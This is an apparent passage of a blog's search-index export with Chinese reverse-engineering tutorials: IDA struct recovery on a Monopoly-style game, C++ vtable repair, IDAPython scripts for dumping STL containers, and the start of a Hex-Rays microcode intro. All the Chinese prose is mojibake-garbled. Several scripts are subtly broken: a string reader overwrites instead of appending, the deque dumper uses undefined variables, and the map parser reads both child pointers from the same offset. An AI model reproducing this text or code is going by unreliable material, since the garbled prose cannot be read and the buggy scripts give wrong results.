è®¾ç½®å¥½ä¹‹åä¸‹é¢æœªå®šä¹‰çš„ä¹Ÿéœ€è¦æ”¹æˆdwordï¼Œå°±åƒè¿™æ · å…¶ä»–å˜é‡ä¹Ÿæ˜¯ä¸€æ ·ä¿®æ”¹ï¼ŒæŠŠå‰©ä¸‹çš„ä¹Ÿä¿®æ”¹äº†ï¼Œä½†æ˜¯å½“æœ€åä¸€ä¸ªå±æ€§æ”¹ä¸ºdwordåï¼Œæ€»å¤§å°å‘ç”Ÿäº†æ”¹å˜ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸‹é¢å†å¢åŠ ä¸€ä¸ªå˜é‡å³å¯ æœ€åå°±æ˜¯è¿™æ · ç„¶ååœ¨æºç ä¸­æ‘F5ï¼Œä»£ç å°±å¥½çœ‹å¤šäº† ä¸Šé¢å¾ªç¯å¤„field_4cæ˜¯ä»¥4å­—èŠ‚è¿›è¡Œè®¿é—®ï¼Œå¹¶ä¸”è®¿é—®5è¯ï¼Œä¹Ÿå°±æ˜¯è¯´field_4cå¼€å§‹å¤„æ˜¯ä¸€ä¸ªä»¥4å­—èŠ‚ä¸ºå•ä½çš„ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„å¤§å°ä¸º5ï¼Œåœ¨ç»“æ„ä½“å®šä¹‰å¤„ï¼Œå³é”®ç‚¹arrayè®¾ç½®æ•°ç»„ï¼Œå¤§å°ä¸º5 æœ€ç»ˆfield_4cåé¢çš„å˜é‡ä¹Ÿå°†åˆå¹¶è¿›å…¥æ•°ç»„ä¸­ æºç èˆ’æœï¼Œé‡å‘½åä¸ºarray1 è¿™é‡Œè¿›è¡Œå­—ç¬¦ä¸²çš„åˆå§‹åŒ–å’Œèµ‹å€¼æ“ä½œ è¿™é‡Œæˆ‘ä»¬å°†field_20æ”¹ä¸ºstr1 æ ¹æ®å¤§å¯Œç¿æ¸¸æˆï¼Œåˆå§‹åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ ¹æ®åå­—éƒ½æ˜¯ä¸€äº›å»ºç­‘ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®šä¹‰çš„ç»“æ„ä½“åç§°æ”¹æˆhouseï¼Œç„¶åå°†æ„é€ å‡½æ•°æ”¹æˆinit_house ç„¶åç»è¿‡æ„é€ å‡½æ•°ï¼Œç”³è¯·åˆ°çš„å¯¹è±¡å†…å­˜éƒ½ä¼šå­˜æ”¾åˆ°ï¼Œä»¥A1C0ä¸ºé¦–çš„åœ°å€å¤„ ä¸Šé¢ä¸€å…±64ä¸ªä½ç½®ï¼Œæ‰€ä»¥ç±»å‹ä¸ºhouse *ä¸ºç±»å‹ï¼Œæ•°ç»„é•¿åº¦ä¸º64ä¸ªæ¥å­˜æ”¾houseå¯¹è±¡çš„æŒ‡é’ˆ è¿™é‡Œå†å³é”®arrayæ”¹ä¸º64 è¿™äº›å»ºç­‘æ­£å¥½å½¢æˆåœ°å›¾ï¼Œå°†æ•°ç»„åæ”¹æˆmapå³å¯ åˆ†æå¦å¤–ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æ²¡æœ‰ä½¿ç”¨ new &#x2F; malloc åˆ†é…å†…å­˜ï¼Œå¦‚ä½•ç¡®å®šå¤§å°ï¼Ÿ è¿›å…¥å‡½æ•°ï¼Œçœ‹èµ·æ¥æ˜æ˜¾æ˜¯ä¸ªåˆå§‹åŒ–å‡½æ•° ä¸¤ä¸ªå˜é‡éƒ½æ˜¯ç´§æŒ¨ç€çš„åœ¨å†…å­˜ä¸­ï¼Œå±äºé™æ€åˆ†é…äº† ä¸¤ä¸ªå˜é‡ä½ç½®ç›¸å‡ä¸º0x80ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æš‚æ—¶ç¡®å®šè¿™ä¸ªç»“æ„ä½“çš„å¤§å°ä¸º0x80ï¼Œç„¶åæˆ‘å°±å»structè§†å›¾ä¸­å»åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º0x80çš„ç»“æ„ä½“ï¼Œè¿˜æ˜¯è€æ“ä½œ è¿™é‡Œå…¶å®å¯ä»¥å…ˆåˆ›å»º64é•¿åº¦çš„æ•°ç»„ï¼Œç„¶åå†å–æ¶ˆå®šä¹‰ï¼Œè¿™æ ·å°±å¯ä»¥å¿«é€Ÿåˆ›å»ºç»“æ„ä½“äº† ç±»å‹å®šä¹‰å¥½ä¹‹åï¼Œå‡½æ•°å¤–çš„å…¨å±€å˜é‡ç±»å‹ä¸æ€¥ç€æ›´æ”¹ï¼Œå…ˆæ›´æ”¹å‡½æ•°å½¢å‚çš„ç±»å‹ åœ¨å‡½æ•°ä¸­åˆ¤æ–­feild_20å¯èƒ½æ˜¯ä¸ªæ•°ç»„ï¼Œè¿™é‡Œå…ˆä¸ç†ä¼š åé¢å‡½æ•°å½¢å‚ç±»å‹ä¹Ÿéœ€è¦ä¸€ä¸ªä¸ªå»ä¿®æ”¹ åˆ·æ–°ä¸€ä¸‹å˜æˆè¿™æ ·äº†ï¼Œç»™å˜é‡æ”¹ä¸ªå æŠŠå‰©ä½™éœ€è¦ä¿®æ”¹çš„å˜é‡å¤§å°ç»§ç»­æ›´æ”¹ ç„¶åè¿™é‡Œæ ¹æ®printfçš„å­—ç¬¦ä¸²ä¿¡æ¯æ¥åˆ¤æ–­ç»“æ„ä½“çš„ç±»å‹ v6å¯èƒ½æ˜¯å»ºç­‘çš„ç±»å‹ï¼Œä»mapæ•°ç»„ä¸­å–å‡ºæ¥çš„ç»“æ„ä½“éƒ½æ˜¯houseç±»å‹äº†ï¼Œç„¶åæŠŠå˜é‡åéƒ½æ”¹æˆè‡ªå·±çŒœæƒ³çš„åå­—ã€‚ è¿™ä¸ªå‡½æ•°çš„å®å‚æ˜¯mapæ•°ç»„å…ƒç´ ï¼Œå½¢å‚åº”è¯¥æ”¹ä¸ºhouseç»“æ„ä½“æŒ‡é’ˆ è¿™é‡Œæœ‰ä¸ªfield_40,ä¸èƒ½ç¡®å®šæ˜¯å•¥ æˆ‘ä»¬å¯ä»¥ç”¨äº¤å‰å¼•ç”¨ï¼Œå»åˆ«çš„åœ°æ–¹æ‰¾ä¿¡æ¯ï¼Œåˆšå¥½è¿™é‡Œæœ‰ä¸€å¤„ è¿™é‡Œå°†ppp1èµ‹ç»™field_40ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å°†field_40æ”¹æˆç»“æ„ä½“2ç±»å‹ ä»¥ä¸Šå°±æ˜¯éšæ„é€†å‘çš„ç»“æœï¼ŒçœŸæ­£æ­£ç»é€†å‘éƒ½æ˜¯è¦åˆ†æç¨‹åºé€»è¾‘çš„ï¼Œæˆ‘ä»¬å…ˆéšæ„é€†å‘ï¼Œåˆ†æéƒ¨åˆ†å±æ€§ä¿¡æ¯ï¼Œæœ‰åŠ©äºæˆ‘ä»¬ä¹‹åçš„åˆ†æ ç¨‹åºåˆšå¼€å§‹ä¼šè®©æˆ‘ä»¬è¾“å…¥æ¸¸æˆéš¾åº¦ç­‰çº§ ç»è¿‡åˆ†æè¿™ä¸ªå°±æ˜¯è·å–æ•°å­—çš„å‡½æ•° ç„¶åæˆ‘ä»¬å…ˆä»ç®€å•çš„easy_levelå¼€å§‹ ä»è¿™åˆ†æå‡ºppp3æ˜¯ç©å®¶çš„æ„æ€ï¼Œå› ä¸ºåˆšå¼€å§‹å®ƒå°±ç»™ppp3ç»™åˆ°åˆå§‹çš„é‡‘é¢äº† ç„¶åè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œé¦–å…ˆè¿›å…¥è¿™ä¸ªå‡½æ•° è¿™ä¸ªå‡½æ•°å¾ˆæ˜æ˜¾æ˜¯ä¸ªå¾ªç¯ æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªåªæœ‰player1å¦å¤–è¿˜æœ‰player2ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªäººç©ç©ï¼Œå¦ä¸€ä¸ªäººç© ç„¶åè¿™é‡Œæˆ‘ä»¬éœ€è¦è¾“å…¥æˆ‘ä»¬æƒ³åšçš„å†…å®¹ æˆ‘ä»¬å…ˆä»¥ç¬¬ä¸€ä¸ªï¼Œè¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œåº”è¯¥æ˜¯ç©å®¶èµ„äº§æ•°é‡ è¦æ±‚è¾“å…¥çš„å€¼ä¸èƒ½è¶…è¿‡ï¼Œç©å®¶æ‹¥æœ‰çš„èµ„äº§çš„æ•°é‡ã€‚æ‰€ä»¥sub_452Få‡½æ•°ä¼°è®¡å°±æ˜¯èµ„äº§çš„å”®å–äº† è¿™é‡Œå”®å–çš„å‡½æ•°ä¸­ è¿™é‡Œèµ„äº§æ•°ç»„å¤§å°ä¸ºmapçš„æ€»ä¸ªæ•°ä¸º64ä¸ª ç„¶åæ˜¯3ï¼Œè´­ä¹°èµ„äº§ åˆ†æå¾— æœ€ç»ˆï¼š å…¨å±€å­—æ®µäº¤å‰å¼•ç”¨ Ctrl + alt + X ï¼ˆè¦å°½å¯èƒ½å°†ç›¸å…³å‡½æ•°æ‰¾å‡ºæ¥å¹¶ä¿®å¤ç±»å‹ï¼Œæœ‰åˆ©äºæŸ¥æ‰¾ï¼‰ IDA è™šè¡¨ä¿®å¤å®éªŒææ–™ï¼š vtable è™šè¡¨å°±æ˜¯C++å®ç°å¤šæ€çš„ä¸€ç§æœºåˆ¶ ä¸ºäº†å®ç°C++çš„å¤šæ€ï¼ŒC++ä½¿ç”¨äº†ä¸€ç§åŠ¨æ€ç»‘å®šçš„æŠ€æœ¯ã€‚è¿™ä¸ªæŠ€æœ¯çš„æ ¸å¿ƒæ˜¯è™šå‡½æ•°è¡¨ï¼Œå½“ä¸€ä¸ªç±»ï¼ˆAï¼‰ç»§æ‰¿å¦ä¸€ä¸ªç±»ï¼ˆBï¼‰æ—¶ï¼Œç±»Aä¼šç»§æ‰¿ç±»Bçš„å‡½æ•°çš„è°ƒç”¨æƒã€‚æ‰€ä»¥å¦‚æœä¸€ä¸ªåŸºç±»åŒ…å«äº†è™šå‡½æ•°ï¼Œé‚£ä¹ˆå…¶ç»§æ‰¿ç±»ä¹Ÿå¯è°ƒç”¨è¿™äº›è™šå‡½æ•°ï¼Œæ¢å¥è¯è¯´ï¼Œä¸€ä¸ªç±»ç»§æ‰¿äº†åŒ…å«è™šå‡½æ•°çš„åŸºç±»ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»ä¹Ÿæ‹¥æœ‰è‡ªå·±çš„è™šè¡¨ã€‚æˆ‘ä»¬æ¥çœ‹ä»¥ä¸‹çš„ä»£ç ã€‚ç±»AåŒ…å«è™šå‡½æ•°vfunc1ï¼Œvfunc2ï¼Œç”±äºç±»AåŒ…å«è™šå‡½æ•°ï¼Œæ•…ç±»Aæ‹¥æœ‰ä¸€ä¸ªè™šè¡¨ã€‚ 123456789class A &#123;public: virtual void vfunc1(); virtual void vfunc2(); void func1(); void func2();private: int m_data1, m_data2;&#125;; ç±»Açš„è™šè¡¨å¦‚å›¾1æ‰€ç¤º: è™šè¡¨æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œå…¶å…ƒç´ æ˜¯è™šå‡½æ•°çš„æŒ‡é’ˆï¼Œæ¯ä¸ªå…ƒç´ å¯¹åº”ä¸€ä¸ªè™šå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆã€‚éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œæ™®é€šçš„å‡½æ•°å³éè™šå‡½æ•°ï¼Œå…¶è°ƒç”¨å¹¶ä¸éœ€è¦ç»è¿‡è™šè¡¨ï¼Œæ‰€ä»¥è™šè¡¨çš„å…ƒç´ å¹¶ä¸åŒ…æ‹¬æ™®é€šå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆã€‚è™šè¡¨å†…çš„æ¡ç›®ï¼Œå³è™šå‡½æ•°æŒ‡é’ˆçš„èµ‹å€¼å‘ç”Ÿåœ¨ç¼–è¯‘å™¨çš„ç¼–è¯‘é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ä»£ç çš„ç¼–è¯‘é˜¶æ®µï¼Œè™šè¡¨å°±å¯ä»¥æ„é€ å‡ºæ¥äº† è™šè¡¨ä¿®å¤ä¸»è¦æ˜¯ä¸ºäº†é‡å»ºè™šè¡¨äº¤å‰å¼•ç”¨,ä¸€èˆ¬ç±»çš„ç¬¬ä¸€ä¸ªåœ°å€å°±æ˜¯è™šè¡¨çš„åœ°å€ã€‚ è¿™é‡Œå°±æ˜¯è°ƒç”¨è™šè¡¨çš„æŸä¸€ä¸ªå‡½æ•° è¿™é‡Œç±»å¤§å°ä¸º0x28å­—èŠ‚ è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°è™šè¡¨ï¼Œç‚¹å‡»è¿™ä¸ªå°±æ˜¯è™šè¡¨ ç„¶åå³è¾¹æ˜¯è™šè¡¨çš„ç¬¦å· è¿™é‡Œå…ˆè¿›è¡Œæ„å»ºç»“æ„ä½“ï¼Œåœ¨ç»“æ„ä½“ä¸­è¡¨ç¤ºè™šè¡¨ï¼Œä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œåœ¨64ä½ä¸­ä¸º32ä½ åˆ›å»ºå¥½åï¼Œåˆ›å»ºç±»ç»“æ„ä½“ï¼Œç„¶åå°†ç±»ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªå±æ€§ç±»å‹è®¾ç½®ä¸ºè™šè¡¨ç±»å‹ ç„¶åå°†v3çš„ç±»å‹è®¾ç½®ä¸ºç±»ç»“æ„ä½“ç±»å‹ ç„¶åå°±ä¿®å¤å®Œæˆäº†","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"STLé€†å‘","slug":"stdé€†å‘","date":"2023-01-20T12:03:08.000Z","updated":"2023-01-20T12:47:25.636Z","comments":true,"path":"2023/01/20/stdé€†å‘/","link":"","permalink":"https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/","excerpt":"c++ STL","text":"c++ STL STL é€†å‘æ–¹æ³•è®º è¯†åˆ« STL å®¹å™¨ç±»å‹ è¯†åˆ« STL å®¹å™¨æ“ä½œ æå– STL å®¹å™¨ä¸­çš„æ•°æ® é€†å‘ STL ä¸»è¦çš„é—®é¢˜: ç¼ºå°‘ç¬¦å·ï¼Œæ— æ³•åˆ¤æ–­ STL å®¹å™¨ç±»å‹ ï¼ˆä¸»è¦å›°éš¾ï¼‰ STL å†…éƒ¨æ•°æ®ç»“æ„å¤æ‚ï¼Œéš¾ä»¥æå–æ•°æ® ä¼˜åŒ–ä½¿å¤§é‡ stl å‡½æ•°è¢« inline æ–¹æ³•ï¼šè§£æ STL å®¹å™¨å†…å­˜æ•°æ®ï¼Œä»å†…å­˜æ•°æ®è§’åº¦åˆ¤æ–­å®¹å™¨ç±»å‹ï¼Œæå–å®¹å™¨å†…å®¹åˆ¤æ–­å‡½æ•°æ“ä½œã€‚ å¸¸è§ STL å®¹å™¨åºåˆ—å®¹å™¨ vector Deque List String å…³è”å®¹å™¨ Pair Map Set MultiMap &#x2F; MultiSet æ— åºå…³è”å®¹å™¨:unordered_map C++ STLå…³è”å¼å®¹å™¨æ˜¯ä»€ä¹ˆï¼Ÿæ­¤ç±»å®¹å™¨åœ¨å­˜å‚¨å…ƒç´ å€¼çš„åŒæ—¶ï¼Œè¿˜ä¼šä¸ºå„å…ƒç´ é¢å¤–å†é…å¤‡ä¸€ä¸ªå€¼ï¼ˆåˆç§°ä¸ºâ€œé”®â€ï¼Œå…¶æœ¬è´¨ä¹Ÿæ˜¯ä¸€ä¸ª C++ åŸºç¡€æ•°æ®ç±»å‹æˆ–è‡ªå®šä¹‰ç±»å‹çš„å…ƒç´ ï¼‰ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯åœ¨ä½¿ç”¨å…³è”å¼å®¹å™¨çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå·²çŸ¥ç›®æ ‡å…ƒç´ çš„é”®çš„å€¼ï¼Œåˆ™ç›´æ¥é€šè¿‡è¯¥é”®å°±å¯ä»¥æ‰¾åˆ°ç›®æ ‡å…ƒç´ ï¼Œè€Œæ— éœ€å†é€šè¿‡éå†æ•´ä¸ªå®¹å™¨çš„æ–¹å¼ã€‚ å¼ƒç”¨åºåˆ—å¼å®¹å™¨ï¼Œè½¬è€Œé€‰ç”¨å…³è”å¼å®¹å™¨å­˜å‚¨å…ƒç´ ï¼Œå¾€å¾€å°±æ˜¯çœ‹ä¸­äº†å…³è”å¼å®¹å™¨å¯ä»¥å¿«é€ŸæŸ¥æ‰¾ã€è¯»å–æˆ–è€…åˆ é™¤æ‰€å­˜å‚¨çš„å…ƒç´ ï¼ŒåŒæ—¶è¯¥ç±»å‹å®¹å™¨æ’å…¥å…ƒç´ çš„æ•ˆç‡ä¹Ÿæ¯”åºåˆ—å¼å®¹å™¨é«˜ã€‚ å¸¸è§ STL å®¹å™¨é€‚é…å™¨å®¹å™¨é€‚é…å™¨æ˜¯ä¸€ä¸ªå°è£…äº†åºåˆ—å®¹å™¨çš„ç±»æ¨¡æ¿ï¼Œå®ƒåœ¨ä¸€èˆ¬åºåˆ—å®¹å™¨çš„åŸºç¡€ä¸Šæä¾›äº†ä¸€äº›ä¸åŒçš„åŠŸèƒ½ã€‚ä¹‹æ‰€ä»¥ç§°ä½œé€‚é…å™¨ç±»ï¼Œæ˜¯å› ä¸ºå®ƒå¯ä»¥é€šè¿‡é€‚é…å®¹å™¨ç°æœ‰çš„æ¥å£æ¥æä¾›ä¸åŒçš„åŠŸèƒ½ã€‚ å…¶å®ï¼Œå®¹å™¨é€‚é…å™¨ä¸­çš„â€œé€‚é…å™¨â€ï¼Œå’Œç”Ÿæ´»ä¸­å¸¸è§çš„ç”µæºé€‚é…å™¨ä¸­â€œé€‚é…å™¨â€çš„å«ä¹‰éå¸¸æ¥è¿‘ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæ— è®ºæ˜¯ç”µè„‘ã€æ‰‹æœºè¿˜æ˜¯å…¶å®ƒç”µå™¨ï¼Œå……ç”µæ—¶éƒ½æ— æ³•ç›´æ¥ä½¿ç”¨ 220V çš„äº¤æµç”µï¼Œä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ï¼Œå„ä¸ªç”µå™¨å‚å•†éƒ½ä¼šæä¾›ä¸€ä¸ªé€‚ç”¨äºè‡ªå·±äº§å“çš„ç”µæºçº¿ï¼Œå®ƒå¯ä»¥å°† 220V çš„äº¤æµç”µè½¬æ¢æˆé€‚åˆç”µå™¨ä½¿ç”¨çš„ä½å‹ç›´æµç”µã€‚ ä»ç”¨æˆ·çš„è§’åº¦çœ‹ï¼Œç”µæºçº¿æ‰®æ¼”çš„è§’è‰²å°±æ˜¯å°†åŸæœ¬ä¸é€‚ç”¨çš„äº¤æµç”µå˜å¾—é€‚ç”¨ï¼Œå› æ­¤å…¶åˆè¢«ç§°ä¸ºç”µæºé€‚é…å™¨ã€‚ ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾ä¸€ä¸ªä»£ç æ¨¡å— Aï¼Œå®ƒçš„æ„æˆå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567class A&#123;public: void f1()&#123;&#125; void f2()&#123;&#125; void f3()&#123;&#125; void f4()&#123;&#125;&#125;; ç°åœ¨æˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€ä¸ªæ¨¡æ¿ Bï¼Œä½†å‘ç°ï¼Œå…¶å®åªéœ€è¦ç»„åˆä¸€ä¸‹æ¨¡å— A ä¸­çš„ f1()ã€f2()ã€f3()ï¼Œå°±å¯ä»¥å®ç°æ¨¡æ¿ B éœ€è¦çš„åŠŸèƒ½ã€‚å…¶ä¸­ f1() å•ç‹¬ä½¿ç”¨å³å¯ï¼Œè€Œ f2() å’Œ f3() éœ€è¦ç»„åˆèµ·æ¥ä½¿ç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112class B&#123;private: A * a;public: void g1()&#123; a-&gt;f1(); &#125; void g2()&#123; a-&gt;f2(); a-&gt;f3(); &#125;&#125;; å¯ä»¥çœ‹åˆ°ï¼Œå°±å¦‚åŒæ˜¯ç”µæºé€‚é…å™¨å°†ä¸é€‚ç”¨çš„äº¤æµç”µå˜å¾—é€‚ç”¨ä¸€æ ·ï¼Œæ¨¡æ¿ B å°†ä¸é€‚åˆç›´æ¥æ‹¿æ¥ç”¨çš„æ¨¡æ¿ A å˜å¾—é€‚ç”¨äº†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†æ¨¡æ¿ B ç§°ä¸º B é€‚é…å™¨. å®¹å™¨é€‚é…å™¨ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ï¼Œç®€å•çš„ç†è§£å®¹å™¨é€‚é…å™¨ï¼Œå…¶å°±æ˜¯å°†ä¸é€‚ç”¨çš„åºåˆ—å¼å®¹å™¨ï¼ˆåŒ…æ‹¬ vectorã€deque å’Œ listï¼‰å˜å¾—é€‚ç”¨ã€‚å®¹å™¨é€‚é…å™¨çš„åº•å±‚å®ç°å’Œæ¨¡æ¿ Aã€B çš„å…³ç³»æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå³é€šè¿‡å°è£…æŸä¸ªåºåˆ—å¼å®¹å™¨ï¼Œå¹¶é‡æ–°ç»„åˆè¯¥å®¹å™¨ä¸­åŒ…å«çš„æˆå‘˜å‡½æ•°ï¼Œä½¿å…¶æ»¡è¶³æŸäº›ç‰¹å®šåœºæ™¯çš„éœ€è¦ã€‚ stackï¼ˆSTL stackï¼‰å®¹å™¨é€‚é…å™¨:é‡‡ç”¨é»˜è®¤çš„ deque åŸºç¡€å®¹å™¨ queueå®¹å™¨é€‚é…å™¨:å…¶åº•å±‚ä½¿ç”¨çš„åŸºç¡€å®¹å™¨é€‰æ‹©é»˜è®¤çš„ deque å®¹å™¨ priority_queue ï¼švector é€†å‘æ—¶å¤„ç†å®¹å™¨é€‚é…å™¨åªéœ€è¦ç”¨åº•å±‚å®¹å™¨æ¥å¤„ç†å³å¯ STL å„é«˜çº§ç±»å‹dumpæ•°æ®std::string å›ºå®šé•¿åº¦ 32 å­—èŠ‚ï¼Œ4 ä¸ª dq ç¬¬ä¸€ä¸ªæŒ‡é’ˆå­—æ®µæŒ‡å‘æ•°æ®åœ°å€ ç¬¬äºŒä¸ª size_t å­—æ®µå­˜å‚¨å­—ç¬¦ä¸²é•¿åº¦ å†…å­˜åˆ†å¸ƒï¼š IDA dumpè„šæœ¬ï¼š 1234567891011121314def read_dbg_cppstr_64(objectAddr): # a easy function for read std:string # é¦–åœ°å€å°±æ˜¯beginæŒ‡é’ˆ strPtr = idc.read_dbg_qword(objectAddr) result = &#x27;&#x27; i = 0 while True: onebyte = idc.read_dbg_byte(strPtr + i) if onebyte == 0: break else: result = chr(onebyte) i += 1 return result std::stringsteamå¯ä»¥çœ‹ä½œæ˜¯è¯»å†™æ–‡ä»¶ å†…å­˜åˆ†å¸ƒï¼š std::vector å›ºå®šé•¿åº¦ 24 å­—èŠ‚ï¼Œ3 ä¸ª dq ç¬¬ä¸€ä¸ªæŒ‡é’ˆå­—æ®µæŒ‡å‘æ•°ç»„èµ·å§‹åœ°å€ ç¬¬äºŒä¸ªæŒ‡é’ˆå­—æ®µæŒ‡å‘æ•°ç»„æœ€åå…ƒç´ åœ°å€ ç¬¬ä¸‰ä¸ªæŒ‡é’ˆå­—æ®µæŒ‡å‘æœ€å¤§å†…å­˜åœ°å€ å†…å­˜åˆ†å¸ƒï¼š IDA dumpè„šæœ¬ 12345678def vetor_dump(addr): ELEMENT_SIZE = 8 data_addr = [] vetor_base = idc.read_dbg_qword(addr + 0x0) vetor_end = idc.read_dbg_qword(addr + 0x8) for i in range(vetor_base,vetor_end,ELEMENT_SIZE): data_addr.append(i) return data_addr std::list åŒå‘å¾ªç¯é“¾è¡¨å­˜å‚¨ å¤´ç»“æ„ + èŠ‚ç‚¹ç»“æ„ éå†é•¿åº¦å¯ä»¥ç”¨ size å­—æ®µç¡®å®š å†…å­˜å¸ƒå±€ï¼š IDA dump è„šæœ¬ï¼š 1234567def dump_stl_list(p_list_addr): data_addr = [] list_size = idc.read_dbg_qword(p_list_addr+0x10) cur_node = p_list_addr for i in range(list_size): cur_node = idc.read_dbg_qword(cur_node + 0x0) data_addr.append(cur_node + 0x10) std::deque å¤´ç»“æ„ + è¿­ä»£å™¨ç»“æ„ é€‚ç”¨ std::deque &#x2F; std::stack stl_deque.start.node ç¡®å®šfirst map é¡¹ä½ç½® stl_deque.start.last - stl_deque.start.first ç¡®å®šç¼“å†²åŒºå¤§å° stl_deque.finish.node ç¡®å®šlast map é¡¹ä½ç½® å¯¹äºæ¯ä¸€ä¸ª map é¡¹ï¼š start é¡¹ï¼Œè§£æ cur, last åŒºé—´ finish é¡¹ï¼Œè§£æ start, cur åŒºé—´ å…¶ä½™é¡¹ï¼Œè§£æ start, last åŒºé—´ å†…å­˜å¸ƒå±€: IDA dump è„šæœ¬: 1234567891011121314151617181920212223242526272829303132deque_iter = namedtuple(&#x27;deque_iter&#x27;,[&#x27;cur&#x27;,&#x27;first&#x27;,&#x27;last&#x27;,&#x27;node&#x27;])def parse_iter(addr): # è§£æé˜Ÿåˆ—è¿­ä»£å™¨ cur = idc.read_dbg_qword(addr + 0x0) first = idc.read_dbg_qword(addr + 0x8) last = idc.read_dbg_qword(addr + 0x10) node = idc.read_dbg_qword(addr + 0x18) return deque_iter(cur,first,last,node)def dump_deque(addr): ELEMENT_SIZE = 4 # std::deque&lt;xx&gt; xx çš„ç±»å‹å¤§å°æ¥æŒ‡å®š data_addr = [] start_iter = parse_iter(addr + 0x10) finish_iter = parse_iter(addr + 0x30) buf_size = start_iter.last - start_iter.first map_size = start_iter.node map_finish = finish_iter.node # è§£æç¬¬ä¸€ä¸ªç¼“å­˜æ•°æ® for i in range(start_iter.cur,start_iter.last,ELEMENT_SIZE): data_addr.append(i) # è§£ææœ€åä¸€ä¸ªç¼“å­˜æ•°æ® for i in range(finish_iter.first,finish_iter.cur,ELEMENT_SIZE): data_addr.append(i) # è§£æä¸­é—´ç¼“å­˜æ•°æ® for i in range(map_start + 8,map_finish - 8,8): buf_start = idc.read_dbg_qword(b) for i in range(buf_start,buf_start + buf_size, ELEMENT_SIZE): data_addr.append(i) return data_addr std::map åº•å±‚é‡‡ç”¨ Rb-Tree å®ç°ï¼ˆçº¢é»‘äºŒå‰æ ‘ï¼‰ å¤´ç»“æ„ + èŠ‚ç‚¹ç»“æ„ ç”¨äºŒå‰æ ‘éå†å¯æå–æ•°æ® é€‚ç”¨ std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset å†…å­˜åˆ†å¸ƒï¼š IDA dump è„šæœ¬ï¼š 123456789101112131415161718192021def parse_gnu_map_header(address): root = idc.read_dbg_qword(address + 0x10) return rootdef parse_gnu_map_node(address): left = idc.read_dbg_qword(address + 0x10) right = idc.read_dbg_dword(address + 0x10) data = address + 0x20 return left, right, datadef parse_gnu_map_travel(address): # address &lt;â€”â€” std::map struct address result = [] worklist = [parse_gnu_map_header(address)] while len(worklist) &gt; 0: addr = worklist.pop() (left, right, data) = parse_gnu_map_node(addr) if left &gt; 0: worklist.append(left) if right &gt; 0: worklist.append(right) result.append(data) return result std::unsorted_map åº•å±‚é‡‡ç”¨ HashTable å®ç° å¤´ç»“æ„ + Bucket æ•°ç»„ + èŠ‚ç‚¹ç»“æ„ æ‰€æœ‰èŠ‚ç‚¹ç»“æ„ç”¨å•é“¾è¡¨ä¸²è”ï¼ˆ****dump åªéœ€è¦éå†å•é“¾è¡¨ï¼‰ å¤´ç»“æ„çš„ç¬¬ä¸‰ä¸ªå­—æ®µä¸ºå•é“¾è¡¨å¤´ é€‚ç”¨ **std::**unsorted_map **&#x2F; std::**unsorted_set &#x2F; â€¦ å†…å­˜å¸ƒå±€: IDA dump è„šæœ¬: 123456789def dump_stl_hashmap(addr): # dump stl hashmap gnu c++ x64 data_addr = [] bucket_addr = idc.read_dbg_qword(addr + 0x10) node_addr = bucket_addr while node_addr != 0: data_addr.append(node_addr + 0x8) node_addr = idc.read_dbg_qword(node_addr) return data_addr std::shared_ptrç¬¬ä¸€ä¸ªæŒ‡é’ˆå°±æ˜¯æ•°æ®æŒ‡é’ˆ å†…å­˜å¸ƒå±€ï¼š å®æˆ˜éƒ¨åˆ†","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"Microcode","slug":"Microcode","date":"2023-01-19T14:09:48.000Z","updated":"2023-01-21T05:43:58.826Z","comments":true,"path":"2023/01/19/Microcode/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/Microcode/","excerpt":"è®°å½•Microcode","text":"è®°å½•Microcode ä»‹ç»Microcode æ˜¯ hexrays å†…éƒ¨é‡‡ç”¨çš„ä»‹äºæœºå™¨ä»£ç ä¸ä¼ªä»£ç ä¹‹é—´çš„ä¸€ç§ä¸­é—´è¡¨ç¤ºè¯­è¨€(IR)ã€‚ Microcode ç”Ÿæˆå®Œæˆåï¼ŒIDA åœ¨ Microcode çš„åŸºç¡€ä¸Šç”Ÿæˆ CTreeã€‚ CTree æ˜¯ IDA å†…éƒ¨ç”¨äºè¡¨ç¤º Cè¯­è¨€ä¼ªä»£ç çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ŒIDA ä¹Ÿæä¾›äº†å¤§é‡ API æ“ä½œ 